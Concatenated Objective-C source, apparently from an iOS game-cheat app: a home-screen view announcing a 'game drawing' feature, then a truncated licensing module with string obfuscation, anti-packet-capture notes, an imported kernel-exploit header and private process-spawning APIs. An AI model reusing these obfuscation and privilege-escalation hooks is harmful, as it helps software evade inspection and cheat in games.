#import "ESPHomeContentView.h"

@interface ESPHomeContentView ()
@property (nonatomic, strong) UIView *headerCard;
@property (nonatomic, strong) UIImageView *welcomeIcon;
@property (nonatomic, strong) UILabel *welcomeLabel;
@property (nonatomic, strong) UIImageView *dateIcon;
@property (nonatomic, strong) UILabel *dateLabel;
@property (nonatomic, strong) UIImageView *versionIcon;
@property (nonatomic, strong) UILabel *versionLabel;
@property (nonatomic, strong) UIButton *startButton;  // 开始加载按钮
@property (nonatomic, strong) UIView *announcementCard;
@property (nonatomic, strong) UIImageView *announcementIcon;
@property (nonatomic, strong) UILabel *announcementTitleLabel;
@property (nonatomic, strong) UITextView *announcementTextView;
@property (nonatomic, strong) CAGradientLayer *headerGradient;
@property (nonatomic, strong) CAGradientLayer *announcementGradient;
@end

@implementation ESPHomeContentView

- (instancetype)initWithBackgroundColor:(UIColor *)backgroundColor cornerRadius:(CGFloat)cornerRadius {
    self = [super init];
    if (self) {
        self.backgroundColor = [UIColor clearColor];
        self.clipsToBounds = YES;
        [self setupUI];
    }
    return self;
}

- (void)setupUI {
    // 1. 头部卡片
    self.headerCard = [self createCardView];
    [self addSubview:self.headerCard];
    
    // 头部渐变背景
    self.headerGradient = [CAGradientLayer layer];
    self.headerGradient.colors = @[
        (id)[UIColor colorWithRed:0.15 green:0.35 blue:0.65 alpha:0.8].CGColor,
        (id)[UIColor colorWithRed:0.25 green:0.45 blue:0.75 alpha:0.8].CGColor
    ];
    self.headerGradient.startPoint = CGPointMake(0, 0);
    self.headerGradient.endPoint = CGPointMake(1, 1);
    self.headerGradient.cornerRadius = 8;
    [self.headerCard.layer insertSublayer:self.headerGradient atIndex:0];
    
    // 欢迎部分
    self.welcomeIcon = [[UIImageView alloc] initWithImage:[UIImage systemImageNamed:@"sparkles"]];
    self.welcomeIcon.tintColor = [UIColor colorWithRed:1.0 green:0.9 blue:0.3 alpha:1.0];
    [self.headerCard addSubview:self.welcomeIcon];
    
    self.welcomeLabel = [[UILabel alloc] init];
    self.welcomeLabel.text = @"欢迎使用YuanBao-Pro版本";
    self.welcomeLabel.textColor = [UIColor whiteColor];
    self.welcomeLabel.font = [UIFont systemFontOfSize:16 weight:UIFontWeightBold];
    [self.headerCard addSubview:self.welcomeLabel];
    
    // 日期部分
    self.dateIcon = [[UIImageView alloc] initWithImage:[UIImage systemImageNamed:@"calendar.badge.clock"]];
    self.dateIcon.tintColor = [UIColor colorWithRed:0.4 green:0.8 blue:0.6 alpha:1.0];
    [self.headerCard addSubview:self.dateIcon];
    
    self.dateLabel = [[UILabel alloc] init];
    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
    formatter.dateFormat = @"yyyy年MM月dd日";
    self.dateLabel.text = [NSString stringWithFormat:@"当前日期: %@", [formatter stringFromDate:[NSDate date]]];
    self.dateLabel.textColor = [UIColor colorWithWhite:0.95 alpha:0.95];
    self.dateLabel.font = [UIFont systemFontOfSize:14 weight:UIFontWeightMedium];
    [self.headerCard addSubview:self.dateLabel];
    
    // 版本部分
    self.versionIcon = [[UIImageView alloc] initWithImage:[UIImage systemImageNamed:@"tag.fill"]];
    self.versionIcon.tintColor = [UIColor colorWithRed:0.8 green:0.6 blue:1.0 alpha:1.0];
    [self.headerCard addSubview:self.versionIcon];
    
    self.versionLabel = [[UILabel alloc] init];
    NSString *version = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"];
    self.versionLabel.text = [NSString stringWithFormat:@"当前版本: v%@", version ?: @"2.1.0"];
    self.versionLabel.textColor = [UIColor colorWithWhite:0.95 alpha:0.95];
    self.versionLabel.font = [UIFont systemFontOfSize:14 weight:UIFontWeightMedium];
    [self.headerCard addSubview:self.versionLabel];
    
    // 2. 开始加载按钮 (放在头部卡片下方)
    self.startButton = [UIButton buttonWithType:UIButtonTypeSystem];
    [self.startButton setTitle:@"开始加载" forState:UIControlStateNormal];
    [self.startButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.startButton.titleLabel.font = [UIFont systemFontOfSize:16 weight:UIFontWeightMedium];
    self.startButton.backgroundColor = [UIColor colorWithRed:0.2 green:0.6 blue:1.0 alpha:1.0];
    self.startButton.layer.cornerRadius = 6;
    self.startButton.layer.shadowColor = [UIColor colorWithWhite:0 alpha:0.3].CGColor;
    self.startButton.layer.shadowOffset = CGSizeMake(0, 2);
    self.startButton.layer.shadowRadius = 4;
    self.startButton.layer.shadowOpacity = 0.2;
    [self.startButton addTarget:self action:@selector(startButtonTapped) forControlEvents:UIControlEventTouchUpInside];
    [self addSubview:self.startButton];
    
    // 3. 公告卡片 (放在开始按钮下方)
    self.announcementCard = [self createCardView];
    [self addSubview:self.announcementCard];
    
    // 公告渐变背景
    self.announcementGradient = [CAGradientLayer layer];
    self.announcementGradient.colors = @[
        (id)[UIColor colorWithRed:0.25 green:0.25 blue:0.35 alpha:0.8].CGColor,
        (id)[UIColor colorWithRed:0.35 green:0.35 blue:0.45 alpha:0.8].CGColor
    ];
    self.announcementGradient.startPoint = CGPointMake(0, 0);
    self.announcementGradient.endPoint = CGPointMake(1, 1);
    self.announcementGradient.cornerRadius = 8;
    [self.announcementCard.layer insertSublayer:self.announcementGradient atIndex:0];
    
    // 公告内容
    self.announcementIcon = [[UIImageView alloc] initWithImage:[UIImage systemImageNamed:@"megaphone.fill"]];
    self.announcementIcon.tintColor = [UIColor colorWithRed:1.0 green:0.5 blue:0.3 alpha:1.0];
    [self.announcementCard addSubview:self.announcementIcon];
    
    self.announcementTitleLabel = [[UILabel alloc] init];
    self.announcementTitleLabel.text = @"系统公告";
    self.announcementTitleLabel.textColor = [UIColor whiteColor];
    self.announcementTitleLabel.font = [UIFont systemFontOfSize:16 weight:UIFontWeightSemibold];
    [self.announcementCard addSubview:self.announcementTitleLabel];
    
    self.announcementTextView = [[UITextView alloc] init];
    self.announcementTextView.text = @"• 系统版本已更新至v2.0\n• 新增游戏绘制功能\n• 优化了参数调节界面\n• 修复了已知问题";
    self.announcementTextView.textColor = [UIColor colorWithWhite:0.9 alpha:0.95];
    self.announcementTextView.font = [UIFont systemFontOfSize:14 weight:UIFontWeightRegular];
    self.announcementTextView.backgroundColor = [UIColor clearColor];
    self.announcementTextView.editable = NO;
    self.announcementTextView.scrollEnabled = NO;
    self.announcementTextView.textContainerInset = UIEdgeInsetsZero;
    [self.announcementCard addSubview:self.announcementTextView];
    
    [self setupConstraints];
}

- (void)layoutSubviews {
    [super layoutSubviews];
    self.headerGradient.frame = self.headerCard.bounds;
    self.announcementGradient.frame = self.announcementCard.bounds;
}

- (UIView *)createCardView {
    UIView *card = [[UIView alloc] init];
    card.layer.cornerRadius = 8;
    card.layer.shadowColor = [UIColor colorWithWhite:0 alpha:0.3].CGColor;
    card.layer.shadowOffset = CGSizeMake(0, 2);
    card.layer.shadowRadius = 4;
    card.layer.shadowOpacity = 0.2;
    return card;
}

- (void)setupConstraints {
    CGFloat cardSpacing = 10.0;
    CGFloat innerPadding = 10;
    CGFloat verticalSpacing = 8.0;
    CGFloat iconSize = 22.0;
    CGFloat buttonHeight = 44.0;
    
    // 头部卡片约束
    self.headerCard.translatesAutoresizingMaskIntoConstraints = NO;
    [NSLayoutConstraint activateConstraints:@[
        [self.headerCard.topAnchor constraintEqualToAnchor:self.topAnchor],
        [self.headerCard.leadingAnchor constraintEqualToAnchor:self.leadingAnchor],
        [self.headerCard.trailingAnchor constraintEqualToAnchor:self.trailingAnchor],
        [self.headerCard.heightAnchor constraintEqualToConstant:100]
    ]];
    
    // 欢迎部分
    self.welcomeIcon.translatesAutoresizingMaskIntoConstraints = NO;
    self.welcomeLabel.translatesAutoresizingMaskIntoConstraints = NO;
    [NSLayoutConstraint activateConstraints:@[
        [self.welcomeIcon.topAnchor constraintEqualToAnchor:self.headerCard.topAnchor constant:innerPadding],
        [self.welcomeIcon.leadingAnchor constraintEqualToAnchor:self.headerCard.leadingAnchor constant:innerPadding],
        [self.welcomeIcon.widthAnchor constraintEqualToConstant:iconSize],
        [self.welcomeIcon.heightAnchor constraintEqualToConstant:iconSize],
        
        [self.welcomeLabel.centerYAnchor constraintEqualToAnchor:self.welcomeIcon.centerYAnchor],
        [self.welcomeLabel.leadingAnchor constraintEqualToAnchor:self.welcomeIcon.trailingAnchor constant:8]
    ]];
    
    // 日期部分
    self.dateIcon.translatesAutoresizingMaskIntoConstraints = NO;
    self.dateLabel.translatesAutoresizingMaskIntoConstraints = NO;
    [NSLayoutConstraint activateConstraints:@[
        [self.dateIcon.topAnchor constraintEqualToAnchor:self.welcomeIcon.bottomAnchor constant:verticalSpacing],
        [self.dateIcon.leadingAnchor constraintEqualToAnchor:self.headerCard.leadingAnchor constant:innerPadding],
        [self.dateIcon.widthAnchor constraintEqualToConstant:iconSize],
        [self.dateIcon.heightAnchor constraintEqualToConstant:iconSize],
        
        [self.dateLabel.centerYAnchor constraintEqualToAnchor:self.dateIcon.centerYAnchor],
        [self.dateLabel.leadingAnchor constraintEqualToAnchor:self.dateIcon.trailingAnchor constant:8],
        [self.dateLabel.trailingAnchor constraintEqualToAnchor:self.headerCard.trailingAnchor constant:-innerPadding]
    ]];
    
    // 版本部分
    self.versionIcon.translatesAutoresizingMaskIntoConstraints = NO;
    self.versionLabel.translatesAutoresizingMaskIntoConstraints = NO;
    [NSLayoutConstraint activateConstraints:@[
        [self.versionIcon.topAnchor constraintEqualToAnchor:self.dateIcon.bottomAnchor constant:verticalSpacing],
        [self.versionIcon.leadingAnchor constraintEqualToAnchor:self.headerCard.leadingAnchor constant:innerPadding],
        [self.versionIcon.widthAnchor constraintEqualToConstant:iconSize],
        [self.versionIcon.heightAnchor constraintEqualToConstant:iconSize],
        
        [self.versionLabel.centerYAnchor constraintEqualToAnchor:self.versionIcon.centerYAnchor],
        [self.versionLabel.leadingAnchor constraintEqualToAnchor:self.versionIcon.trailingAnchor constant:8],
        [self.versionLabel.trailingAnchor constraintEqualToAnchor:self.headerCard.trailingAnchor constant:-innerPadding]
    ]];
    
    // 开始按钮约束 (放在头部卡片下方)
    self.startButton.translatesAutoresizingMaskIntoConstraints = NO;
    [NSLayoutConstraint activateConstraints:@[
        [self.startButton.topAnchor constraintEqualToAnchor:self.headerCard.bottomAnchor constant:cardSpacing],
        [self.startButton.leadingAnchor constraintEqualToAnchor:self.leadingAnchor],
        [self.startButton.trailingAnchor constraintEqualToAnchor:self.trailingAnchor],
        [self.startButton.heightAnchor constraintEqualToConstant:buttonHeight]
    ]];
    
    // 公告卡片约束 (放在开始按钮下方)
    self.announcementCard.translatesAutoresizingMaskIntoConstraints = NO;
    [NSLayoutConstraint activateConstraints:@[
        [self.announcementCard.topAnchor constraintEqualToAnchor:self.startButton.bottomAnchor constant:cardSpacing],
        [self.announcementCard.leadingAnchor constraintEqualToAnchor:self.leadingAnchor],
        [self.announcementCard.trailingAnchor constraintEqualToAnchor:self.trailingAnchor],
        [self.announcementCard.bottomAnchor constraintEqualToAnchor:self.bottomAnchor]
    ]];
    
    // 公告内容
    self.announcementIcon.translatesAutoresizingMaskIntoConstraints = NO;
    self.announcementTitleLabel.translatesAutoresizingMaskIntoConstraints = NO;
    self.announcementTextView.translatesAutoresizingMaskIntoConstraints = NO;
    [NSLayoutConstraint activateConstraints:@[
        [self.announcementIcon.topAnchor constraintEqualToAnchor:self.announcementCard.topAnchor constant:innerPadding],
        [self.announcementIcon.leadingAnchor constraintEqualToAnchor:self.announcementCard.leadingAnchor constant:innerPadding],
        [self.announcementIcon.widthAnchor constraintEqualToConstant:iconSize],
        [self.announcementIcon.heightAnchor constraintEqualToConstant:iconSize],
        
        [self.announcementTitleLabel.centerYAnchor constraintEqualToAnchor:self.announcementIcon.centerYAnchor],
        [self.announcementTitleLabel.leadingAnchor constraintEqualToAnchor:self.announcementIcon.trailingAnchor constant:8],
        
        [self.announcementTextView.topAnchor constraintEqualToAnchor:self.announcementTitleLabel.bottomAnchor constant:verticalSpacing],
        [self.announcementTextView.leadingAnchor constraintEqualToAnchor:self.announcementCard.leadingAnchor constant:innerPadding],
        [self.announcementTextView.trailingAnchor constraintEqualToAnchor:self.announcementCard.trailingAnchor constant:-innerPadding],
        [self.announcementTextView.bottomAnchor constraintEqualToAnchor:self.announcementCard.bottomAnchor constant:-innerPadding]
    ]];
}

- (void)startButtonTapped {
    if ([self.delegate respondsToSelector:@selector(homeContentViewDidTapStartButton:)]) {
        [self.delegate homeContentViewDidTapStartButton:self];
    }
}

@end
//
//  SpeedAuth.m
//  SpeedYuanBao
//
//  Created by 特特 on 2025/7/7.
//  Copyright © 2025 Laote. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "Config.h"
#include <notify.h>
#import "KFD.hpp"
#include "IOHIDEvent.h"
#include "IOHIDEventData.h"
#include "IOHIDEventTypes.h"
#include "IOHIDEventSystemClient.h"
#include "IOHIDEventSystem.h"
#include "IOHIDService.h"
#include "IOKitLib.h"
#include <atomic>
#include <net/if.h>       // IFF_UP 等标志（若要用到）
#include <arpa/inet.h>    // inet_ntop 等（若要把地址转字符串）
#include <netinet/in.h>   // sockaddr_in / sockaddr_in6
#include <ifaddrs.h>
#include <mutex>
#include <thread>
#include <notify.h>
#include "json.hpp"
#import "SpeedAlertView.h"


/*
 
 防抓包 -> [SpeedBlock disableHttpProxy];
 此功能仅可以防止代理抓包，虽然可以屏蔽绝大多数的抓包方式，但是无法避免如Wireshark这类直接通过网卡抓包的工具
 
 防DNS -> [SpeedBlock enableHttpDns]; // 可能会闪退
 */
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <Foundation/Foundation.h>
#import "MainApplicationDelegate.h"
#import "aes_gcm_secure.h"
#import "LFSimpleLogger.h"
#import "SpeedBlock.h"
#import <objc/message.h>
#import "AFNetworking.h"
#import "SpeedKeyChain.h"
#import "MBProgressHUD+WJExtension.h"
#import "HUDHelper.h"

#import <openssl/pem.h>
#import <openssl/rsa.h>
#import <openssl/sha.h>
#import <openssl/evp.h>
#import <openssl/err.h>
#import <openssl/x509.h>
#import <mach/mach.h>
#import <mach-o/dyld.h>
#import <Security/Security.h>      // SecRandomCopyBytes
#import <openssl/aes.h>
#import <openssl/rand.h>
#import "aes.h"
#import <netdb.h>
#import <dlfcn.h>
#import <arpa/inet.h>
#import <sys/mount.h>
#import <netinet/in.h>
#import <objc/runtime.h>

#import <CommonCrypto/CommonCrypto.h>
#import <CommonCrypto/CommonCryptor.h>
#import <CommonCrypto/CommonDigest.h>

#include <unistd.h>
#include <sys/syscall.h>
#include <sys/sysctl.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#import <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <objc/runtime.h>
// 顶部：需要的头文件
#include <spawn.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <thread>
#include <notify.h>
#import <spawn.h>
#import <spawn.h>
#import <notify.h>
#import <mach-o/dyld.h>


// 可放在文件静态区，方便 completionBlock 里写入
static int g_auth_fd = -1;

static int set_cloexec(int fd) {
    int flags = fcntl(fd, F_GETFD);
    if (flags == -1) return -1;
    return fcntl(fd, F_SETFD, flags | FD_CLOEXEC);
}

static NSString * const kActBlobKey = @"act.blob.v1";
static NSString * const kActMacKey  = @"act.mac.v1";
static NSString * const kSpeedMsgKey = @"speed.secure.msg"; // 自定义即可，注意唯一

#pragma mark - PKCS7 helpers
extern "C" char **environ;

#define POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE 1
extern "C" int posix_spawnattr_set_persona_np(const posix_spawnattr_t* __restrict, uid_t, uint32_t);
extern "C" int posix_spawnattr_set_persona_uid_np(const posix_spawnattr_t* __restrict, uid_t);
extern "C" int posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t* __restrict, uid_t);

#define CHANGED_NAME "com.businiao.launchMain"

#pragma mark - PKCS#7 padding

static NSString * const kICloudKey_ExpireBlob = @"expire_blob_v1";

// 保存：把到期时间(字符串/JSON)加密后写入 iCloud
#import <openssl/err.h>

static NSString *OpenSSLErrorStack(void) {
    unsigned long e = 0;
    NSMutableString *s = [NSMutableString string];
    while ((e = ERR_get_error())) {
        char buf[256]; ERR_error_string_n(e, buf, sizeof(buf));
        [s appendFormat:@"\n- %s", buf];
    }
    return s;
}

static BOOL SaveExpireToICloudEncrypted(NSString *expireString, NSString *passphrase, NSError **error) {
    if (!expireString.length || !passphrase.length) {
        if (error) *error = [NSError errorWithDomain:@"enc" code:-1 userInfo:@{NSLocalizedDescriptionKey:@"参数为空"}];
        return NO;
    }

    NSData *pt = [expireString dataUsingEncoding:NSUTF8StringEncoding];

    unsigned char *out = NULL;
    size_t out_len = 0;
    int rc = gcm_encrypt_with_passphrase((const unsigned char *)pt.bytes, pt.length,
                                         passphrase.UTF8String,
                                         &out, &out_len);

    if (rc != 0 || !out || out_len == 0) {
        NSString *ossl = OpenSSLErrorStack();
        if (error) *error = [NSError errorWithDomain:@"enc" code:rc userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"加密失败 rc=%d%@", rc, ossl.length?ossl:@"" ]}];
        if (out) free(out);
        return NO;
    }

    NSData *blob = [NSData dataWithBytesNoCopy:out length:out_len freeWhenDone:YES];
    NSUbiquitousKeyValueStore *kv = [NSUbiquitousKeyValueStore defaultStore];
    [kv setData:blob forKey:kICloudKey_ExpireBlob];
    BOOL ok = [kv synchronize];
    return ok;
}


__attribute__((always_inline)) NSString *SpeedDesEn7De(NSString *input) {
    if (input.length == 0) return @"";
    typedef NSString* (^EnstrBlock)(NSString*, NSInteger);
    EnstrBlock De_Str = ^(NSString *s1, NSInteger shift) {
        NSMutableString *result = [NSMutableString string];
        for (NSUInteger i = 0; i < s1.length; i++) {
            unichar character = [s1 characterAtIndex:i];
            unichar shiftedCharacter = character - shift;
            [result appendFormat:@"%C", shiftedCharacter];
        }
        return result;
    };
    
    NSInteger re = input.length % 4;
    NSString *v3 = (re > 0) ? [input stringByAppendingString:[De_Str(@"?", 2) stringByPaddingToLength:(4 - re) withString:De_Str(@"?", 2) startingAtIndex:0]] : input;
    NSData *dev4 = [[NSData alloc] initWithBase64EncodedString:v3 options:0];
    if (!dev4) return @"";
    NSString *deok = [[NSString alloc] initWithData:dev4 encoding:NSUTF8StringEncoding];
    if (!deok) return @"";
    NSMutableString *mutableStr = [deok mutableCopy];
    NSUInteger length = mutableStr.length;
    for (NSUInteger i = 0; i < length; i++) {
        unichar character = [mutableStr characterAtIndex:i];
        NSString *replacement = nil;
        switch (character) {
            case 'E': replacement = De_Str(@"[4", 3); break;
            case 'T': replacement = De_Str(@"Z4", 2); break;
            case 'U': replacement = De_Str(@"Y4", 1); break;
            case 'A': replacement = De_Str(@"]9", 5); break;
            case 'D': replacement = De_Str(@"^;", 6); break;
            case 'G': replacement = De_Str(@"_=", 7); break;
            case 'J': replacement = De_Str(@"[:", 3); break;
            case 'L': replacement = De_Str(@"Z:", 2); break;
            case 'V': replacement = De_Str(@"aB", 9); break;
            case 'N': replacement = De_Str(@"^6", 6); break;
            case 'Q': replacement = De_Str(@";;", 8); break;
            case 'O': replacement = De_Str(@"<<<<<", 8); break;
            default: break;
        }
        if (replacement) {
            [mutableStr replaceCharactersInRange:NSMakeRange(i, 1) withString:replacement];
            length = mutableStr.length;
            i += replacement.length - 1;
        }
    }
    typedef NSString* (^SToHBlock)(NSString *);
    SToHBlock HTS = ^NSString *(NSString *input) {
        NSMutableData *data = [NSMutableData data];
        NSInteger length = input.length;
        data.length = length / 2;
        unsigned char *bytes = (unsigned char *)data.mutableBytes;
        for (NSInteger i = 0, j = 0; i < length; i += 2, j++) {
            if (i + 2 <= length) {
                NSString *hexChar = [input substringWithRange:NSMakeRange(i, 2)];
                unsigned int value;
                [[NSScanner scannerWithString:hexChar] scanHexInt:&value];
                bytes[j] = (unsigned char)value;
            }
        }
        return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] ?: @"";
    };
    NSString *result = mutableStr;
    for (int i = 0; i < 4; i++) {
        result = HTS(result);
        if (!result || result.length == 0) break;
    }
    return result ?: @"";
}

__attribute__((always_inline)) NSString *SpeedDesEn7En(NSString *input) {
    if (input.length == 0) return @"";
    
    typedef NSString* (^EnstrBlock)(NSString*, NSInteger);
    EnstrBlock De_Str = ^(NSString *s1, NSInteger shift) {
        NSMutableString *result = [NSMutableString string];
        for (NSUInteger i = 0; i < s1.length; i++) {
            unichar character = [s1 characterAtIndex:i];
            unichar shiftedCharacter = character - shift;
            [result appendFormat:@"%C", shiftedCharacter];
        }
        return result;
    };
    
    typedef NSString* (^SToHBlock)(NSString *);
    SToHBlock STH = ^NSString *(NSString *input) {
        NSData *data = [input dataUsingEncoding:NSUTF8StringEncoding];
        if (!data) return @"";
        const unsigned char *bytes = (const unsigned char *)data.bytes;
        NSInteger length = data.length;
        NSMutableString *newString = [NSMutableString stringWithCapacity:length * 2];
        for (NSInteger i = 0; i < length; i++) {
            [newString appendFormat:@"%02X", bytes[i]];
        }
        return [newString copy];
    };
    NSString *result = input;
    for (int i = 0; i < 4; i++) {
        result = STH(result);
        if (!result || result.length == 0) return @"";
    }
    NSMutableString *mutableResult = [result mutableCopy];
    NSUInteger length = mutableResult.length;
    NSInteger offset = 0;
    while (offset < length) {
        NSRange searchRange = NSMakeRange(offset, MIN(5, length - offset));
        if (searchRange.length >= 5 &&
            [[mutableResult substringWithRange:NSMakeRange(offset, 5)] isEqualToString:De_Str(@"<<<<<", 8)]) {
            [mutableResult replaceCharactersInRange:NSMakeRange(offset, 5) withString:De_Str(@"V", 7)];
            length = mutableResult.length;
            offset += 1;
            continue;
        }
        if (searchRange.length >= 2 &&
            [[mutableResult substringWithRange:NSMakeRange(offset, 2)] isEqualToString:De_Str(@";;", 8)]) {
            [mutableResult replaceCharactersInRange:NSMakeRange(offset, 2) withString:De_Str(@"T", 3)];
            length = mutableResult.length;
            offset += 1;
            continue;
        }
        if (offset < length) {
            unichar character = [mutableResult characterAtIndex:offset];
            NSString *replacement = nil;
            switch (character) {
                case 'X':
                    if (offset + 2 <= length) {
                        unichar nextChar = [mutableResult characterAtIndex:offset + 1];
                        switch (nextChar) {
                            case '1': replacement = De_Str(@"G", 2); break;
                            case '2': replacement = De_Str(@"X", 4); break;
                            case '3': replacement = De_Str(@"]", 8); break;
                            case '4': replacement = De_Str(@"J", 9); break;
                            case '5': replacement = De_Str(De_Str(@"P", 9), 3); break;
                            case '6': replacement = De_Str(@"L", 5); break;
                            case '7': replacement = De_Str(@"P", 6); break;
                            case '8': replacement = De_Str(@"S", 7); break;
                            case '9': replacement = De_Str(@"X", 2); break;
                            case '0': replacement = De_Str(@"S", 5); break;
                            default: break;
                        }
                        if (replacement) {
                            [mutableResult replaceCharactersInRange:NSMakeRange(offset, 2) withString:replacement];
                            length = mutableResult.length;
                            offset += 1;
                            continue;
                        }
                    }
                    break;
                default: break;
            }
        }
        offset++;
    }
    NSData *v1 = [mutableResult dataUsingEncoding:NSUTF8StringEncoding];
    if (!v1) return @"";
    NSString *v2 = [v1 base64EncodedStringWithOptions:0];
    if (!v2) return @"";
    return [v2 stringByTrimmingCharactersInSet:[NSCharacterSet characterSetWithCharactersInString:De_Str(@"?", 2)]];
}



__attribute__((always_inline)) uint32_t SpeedEn_DJB2(const char* str) {
    uint32_t hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

__attribute__((always_inline)) NSString *SpeedEn_3DES(NSString *plainText, NSString *key, NSString *iv) {
    NSData *data = [plainText dataUsingEncoding:NSUTF8StringEncoding];
    NSData *ivData = [[NSData alloc] initWithBase64EncodedString:iv options:0];
    size_t plainTextBufferSize = [data length];
    const void *vplainText = (const void *)[data bytes];
    uint8_t *bufferPtr = NULL;
    size_t bufferPtrSize = 0;
    size_t movedBytes = 0;
    bufferPtrSize = (plainTextBufferSize + kCCBlockSize3DES) & ~(kCCBlockSize3DES - 1);
    bufferPtr = (uint8_t *)malloc(bufferPtrSize * sizeof(uint8_t));
    memset((void *)bufferPtr, 0x0, bufferPtrSize);
    const void *vkey = (const void *)[key UTF8String];
    const void *vinitVec = (const void *)[ivData bytes];
    CCCryptorStatus ccStatus = CCCrypt(kCCEncrypt, kCCAlgorithm3DES, kCCOptionPKCS7Padding, vkey, kCCKeySize3DES, vinitVec, vplainText, plainTextBufferSize, (void *)bufferPtr, bufferPtrSize, &movedBytes);
    if (ccStatus != kCCSuccess) {
        free(bufferPtr);
        return nil;
    }
    NSData *myData = [NSData dataWithBytes:(const void *)bufferPtr length:(NSUInteger)movedBytes];
    free(bufferPtr);
    return [myData base64EncodedStringWithOptions:0];
}
__attribute__((always_inline)) NSString *SpeedDe_3DES(NSString *encryptText, NSString *key, NSString *iv) {
    NSData *encryptData = [[NSData alloc] initWithBase64EncodedString:encryptText options:0];
    NSData *ivData = [[NSData alloc] initWithBase64EncodedString:iv options:0];
    size_t plainTextBufferSize = [encryptData length];
    const void *vplainText = [encryptData bytes];
    uint8_t *bufferPtr = NULL;
    size_t bufferPtrSize = 0;
    size_t movedBytes = 0;
    bufferPtrSize = (plainTextBufferSize + kCCBlockSize3DES) & ~(kCCBlockSize3DES - 1);
    bufferPtr = (uint8_t *)malloc(bufferPtrSize * sizeof(uint8_t));
    memset((void *)bufferPtr, 0x0, bufferPtrSize);
    const void *vkey = (const void *)[key UTF8String];
    const void *vinitVec = [ivData bytes];
    CCCryptorStatus ccStatus = CCCrypt(kCCDecrypt, kCCAlgorithm3DES, kCCOptionPKCS7Padding, vkey, kCCKeySize3DES, vinitVec, vplainText, plainTextBufferSize, (void *)bufferPtr, bufferPtrSize, &movedBytes);
    if (ccStatus != kCCSuccess) {
        free(bufferPtr);
        return nil;
    }
    NSString *result = [[NSString alloc] initWithData:[NSData dataWithBytes:(const void *)bufferPtr length:(NSUInteger)movedBytes] encoding:NSUTF8StringEncoding];
    free(bufferPtr);
    return result;
}

__attribute__((always_inline)) NSString *md5(NSString *input) {
    const char *str = [input UTF8String];
    unsigned char result[CC_MD5_DIGEST_LENGTH];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
    CC_MD5(str, (CC_LONG)strlen(str), result);
#pragma clang diagnostic pop
    NSMutableString *hash = [NSMutableString stringWithCapacity:CC_MD5_DIGEST_LENGTH * 2];
    for (int i = 0; i < CC_MD5_DIGEST_LENGTH; i++) {
        [hash appendFormat:@"%02x", result[i]];
    }
    return hash;
}

__attribute__((always_inline)) NSString *SpeedDe(NSArray *array) {
    NSMutableString *mstring = [NSMutableString string];
    for (NSNumber *n in array) {
        int temp = n.intValue;
        char t2 = (char)temp;
        NSData *data = [NSData dataWithBytes:&t2 length:sizeof(t2)];
        [mstring appendString:[[NSString alloc] initWithData:data encoding:4]];
    }
    return mstring;
}

__attribute__((always_inline)) NSString *StringToHex(NSString *input) {
    NSMutableString *newString = [[NSMutableString alloc] init];
    NSData *data = [input dataUsingEncoding:NSUTF8StringEncoding];
    const unsigned char *bytes = (const unsigned char *)[data bytes];
    for (NSInteger i = 0; i < data.length; i++) {
        [newString appendFormat:@"%02X", bytes[i]];
    }
    return newString;
}

__attribute__((always_inline)) NSString *HexToString(NSString *input) {
    NSMutableData *data = [NSMutableData data];
    NSInteger length = input.length;
    for (NSInteger i = 0; i < length; i += 2) {
        if (i + 2 <= length) {
            NSString *hexChar = [input substringWithRange:NSMakeRange(i, 2)];
            unsigned int value;
            [[NSScanner scannerWithString:hexChar] scanHexInt:&value];
            unsigned char byte = (unsigned char)value;
            [data appendBytes:&byte length:1];
        }
    }
    return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
}

__attribute__((always_inline)) NSString * sha256Hash(NSString *input) {
    const char *cStr = [input UTF8String];
    unsigned char digest[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(cStr, (CC_LONG)strlen(cStr), digest);
    NSMutableString *output = [NSMutableString stringWithCapacity:CC_SHA256_DIGEST_LENGTH * 2];
    for (int i = 0; i < CC_SHA256_DIGEST_LENGTH; i++) {
        [output appendFormat:@"%02x", digest[i]];
    }
    return [output copy];
}

__attribute__((always_inline)) NSString *JSONString(NSString *string) {
    NSMutableString *escapedString = [NSMutableString stringWithString:SpeedDesEn7De(string)];
    [escapedString replaceOccurrencesOfString:@"\\" withString:@"\\\\" options:NSLiteralSearch range:NSMakeRange(0, escapedString.length)];
    [escapedString replaceOccurrencesOfString:@"\"" withString:@"\\\"" options:NSLiteralSearch range:NSMakeRange(0, escapedString.length)];
    [escapedString replaceOccurrencesOfString:@"\n" withString:@"\\n" options:NSLiteralSearch range:NSMakeRange(0, escapedString.length)];
    [escapedString replaceOccurrencesOfString:@"\r" withString:@"\\r" options:NSLiteralSearch range:NSMakeRange(0, escapedString.length)];
    [escapedString replaceOccurrencesOfString:@"\t" withString:@"\\t" options:NSLiteralSearch range:NSMakeRange(0, escapedString.length)];
    [escapedString replaceOccurrencesOfString:@"\b" withString:@"\\b" options:NSLiteralSearch range:NSMakeRange(0, escapedString.length)];
    [escapedString replaceOccurrencesOfString:@"\f" withString:@"\\f" options:NSLiteralSearch range:NSMakeRange(0, escapedString.length)];
    return SpeedDesEn7En(escapedString);
}

__attribute__((always_inline)) NSString *SpeeddicToJson(NSDictionary *dict) {
    NSMutableString *jsonString = [NSMutableString stringWithString:@"{"];
    NSArray *keys = [dict allKeys];
    for (NSUInteger i = 0; i < keys.count; i++) {
        NSString *key = keys[i];
        id value = dict[key];
        [jsonString appendFormat:@"\"%@\":", SpeedDesEn7De(JSONString(SpeedDesEn7En(key)))];
        if ([value isKindOfClass:[NSString class]]) {
            NSString *escapedValue = SpeedDesEn7De(JSONString(SpeedDesEn7En(value)));
            [jsonString appendFormat:@"\"%@\"", escapedValue];
